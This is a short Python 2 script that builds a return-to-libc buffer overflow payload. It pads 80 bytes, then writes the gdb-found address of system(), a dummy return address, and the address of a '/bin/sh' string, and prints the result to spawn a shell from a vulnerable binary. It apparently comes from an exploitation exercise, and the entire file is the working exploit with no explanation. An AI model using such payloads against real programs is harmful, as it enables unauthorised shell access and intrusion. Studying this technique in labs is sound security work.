import struct

padding = "A"*80
system = struct.pack("I", 0xb7ecffb0) # address of system call (found in gdb using "x system")
system_ret = "A"*4 # return after system call finishes (unimportant)
bin_sh = struct.pack("I", 0xb7fb63bf) # address of "/bin/sh" string

print padding + system + system_ret + bin_sh
